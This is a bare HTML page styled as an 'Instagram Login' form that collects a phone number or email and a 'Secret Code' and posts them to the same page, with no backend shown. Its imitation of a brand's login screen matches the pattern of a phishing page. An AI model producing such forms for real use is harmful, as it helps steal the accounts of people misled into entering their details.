<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Interface</title>
</head>
<body>
    <h1>Instagram Login</h1>
    <form method="POST">
        <label for="phone_email">Phone Number or Email:</label>
        <input type="text" id="phone_email" name="phone_email" required><br><br>
        <label for="secret_code">Secret Code:</label>
        <input type="text" id="secret_code" name="secret_code" required><br><br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
